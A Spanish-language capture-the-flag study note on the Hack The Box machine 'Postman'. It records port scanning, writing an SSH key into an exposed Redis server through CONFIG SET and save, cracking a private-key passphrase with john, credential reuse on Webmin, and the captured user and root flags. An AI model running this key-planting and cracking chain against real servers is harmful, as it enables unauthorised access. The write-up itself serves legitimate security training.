-- --
- Tags: #ejptmachine #privilegios #ssh-keygen #redis #id_rsa #john #metasploit 
--- -
### ¿Qué habilidades puedes practicar con Postman?

1. **Reconocimiento y escaneo de puertos:**
    - Al igual que en la mayoría de las máquinas de Hack The Box, el primer paso es realizar un **escaneo de puertos** para identificar los servicios y puertos abiertos. Utilizando herramientas como **Nmap** podrás obtener una visión clara de los servicios disponibles, lo que te permitirá planificar tu ataque.
2. **Explotación de vulnerabilidades web:**
    - En **Postman**, uno de los principales vectores de ataque es una vulnerabilidad en una aplicación web. Deberás realizar un **reconocimiento web** exhaustivo para identificar posibles **vulnerabilidades** como **inyección SQL (SQLi)**, **cross-site scripting (XSS)**, o **autenticación débil**.
    - Este tipo de vulnerabilidad te permitirá obtener acceso al sistema o **obtener credenciales** que te ayuden en etapas posteriores del proceso.
3. **Escalada de privilegios en Linux:**
    - Una vez que consigas acceso inicial al sistema, tendrás que realizar una **escalada de privilegios** para obtener privilegios más altos en el sistema **Linux**. Buscarás **permisos incorrectos** en archivos importantes o configuraciones erróneas en servicios que puedan permitirte elevar tus privilegios.
    - También es común que se necesite **abuso de configuraciones de Sudo** o el aprovechamiento de **vulnerabilidades locales** para lograr la escalada.

---

REPASAR
https://www.youtube.com/watch?v=RreWbxlnCj0&ab_channel=xct

`nmap -p- --min-rate 5000 -sCV -n 10.10.10.160 -oN portScan`
![Pasted image 20241215171854](../../Fotos/Pasted%20image%2020241215171854.png)
`nmap --script "vuln" 10.10.10.160`
![Pasted image 20241215171930](../../Fotos/Pasted%20image%2020241215171930.png)
![Pasted image 20241215171948](../../Fotos/Pasted%20image%2020241215171948.png)

![Pasted image 20241215172427](../../Fotos/Pasted%20image%2020241215172427.png)

`gobuster dir -u 10.10.10.160 -w /usr/share/SecLists/Discovery/Web-Content/common.txt`
![Pasted image 20241215172824](../../Fotos/Pasted%20image%2020241215172824.png)
- Nada interesante hasta el momento

![Pasted image 20241215173128](../../Fotos/Pasted%20image%2020241215173128.png)
Recargamos y aceptamos riesgo de entrar en la web
![Pasted image 20241215173149](../../Fotos/Pasted%20image%2020241215173149.png)
Webmin a menudo se ejecuta como root para permitirle realizar todas las tareas administrativas que hace, así que estaré atento a las credenciales.

`searchsploit webmin`
![Pasted image 20241215174848](../../Fotos/Pasted%20image%2020241215174848.png)

![Pasted image 20241215175019](../../Fotos/Pasted%20image%2020241215175019.png)

![Pasted image 20241215175106](../../Fotos/Pasted%20image%2020241215175106.png)
- No es vulnerable al exploit sin embargo continuaremos con redis.

Interactuamos con NC y Redis
`redis-cli -h 10.10.10.160`
`redis-cli -h postman.htb`
![Pasted image 20241215174520](../../Fotos/Pasted%20image%2020241215174520.png)

`INFO`
- Info sobre redis server pero nada reelevante aqui
![Pasted image 20241215175857](../../Fotos/Pasted%20image%2020241215175857.png)

![Pasted image 20241215181803](../../Fotos/Pasted%20image%2020241215181803.png)

![Pasted image 20241215181945](../../Fotos/Pasted%20image%2020241215181945.png)

`CONFIG SET dir "/var/lib/redis/.ssh"`
`CONFIG SET dbfilename "authorized_keys"`
`flushall`
![Pasted image 20241215182132](../../Fotos/Pasted%20image%2020241215182132.png)

`cat blob.txt| redis-cli -h 10.10.10.160 -x set ssh`
Debemos estar en el directorio del archivo txt, cargamos una clave publica y la renombramos en la maquina victima para poder tener el acceso
![Pasted image 20241215182334](../../Fotos/Pasted%20image%2020241215182334.png)

`redis-cli -h 10.10.10.160 save`
![Pasted image 20241215182403](../../Fotos/Pasted%20image%2020241215182403.png)

`ssh -i redis redis@10.10.10.160`
![Pasted image 20241215182506](../../Fotos/Pasted%20image%2020241215182506.png)

`Maquina Vulnerada Parcialmente`
**Breve explicacion**
![Pasted image 20250102225210](../../Fotos/Pasted%20image%2020250102225210.png)

----
- No podemos ver si quiera el user.txt aun

![Pasted image 20241215182628](../../Fotos/Pasted%20image%2020241215182628.png)

![Pasted image 20241215182641](../../Fotos/Pasted%20image%2020241215182641.png)

Creamos un archivo llamado id_rsa y pegamos la clave privada obtenida
![Pasted image 20241215191456](../../Fotos/Pasted%20image%2020241215191456.png)
- La ruta la cambiaremos al **/opt** del ssh2john.py

![Pasted image 20241215191525](../../Fotos/Pasted%20image%2020241215191525.png)

`/home/kali/Desktop/postman/john/run/john -w:/usr/share/wordlists/rockyou.txt hash`
![Pasted image 20241215191852](../../Fotos/Pasted%20image%2020241215191852.png)
- Clave crackeada: computer2008 

Resulta ser la clave de mat, lo comprobamos tras intentar generar el cambio con su
![Pasted image 20241215194350](../../Fotos/Pasted%20image%2020241215194350.png)

`Maquina Vulnerada`

![Pasted image 20241215194427](../../Fotos/Pasted%20image%2020241215194427.png)

User Flag: 622ace72f0b132d3ada8e8fd766cf9b6


---

*Escalada de Privilegios*

Recordemos que habia un panel webmin de logeo, tras probar las credenciales de Matt son las mismas y logramos acceso al panel
![Pasted image 20241215194632](../../Fotos/Pasted%20image%2020241215194632.png)
- Aparece tambien la webmin version util para buscar exploits

![Pasted image 20241215195933](../../Fotos/Pasted%20image%2020241215195933.png)

![Pasted image 20241215200117](../../Fotos/Pasted%20image%2020241215200117.png)
![Pasted image 20241215200128](../../Fotos/Pasted%20image%2020241215200128.png)
![Pasted image 20241215200215](../../Fotos/Pasted%20image%2020241215200215.png)
![Pasted image 20241215200255](../../Fotos/Pasted%20image%2020241215200255.png)
![Pasted image 20241215200326](../../Fotos/Pasted%20image%2020241215200326.png)

Root Flag: 4bbb7f25247e7e7312ae123a45891b87

----

Preguntas

What is the config directory for redis?
`CONFIG GET *`
/var/lib/redis



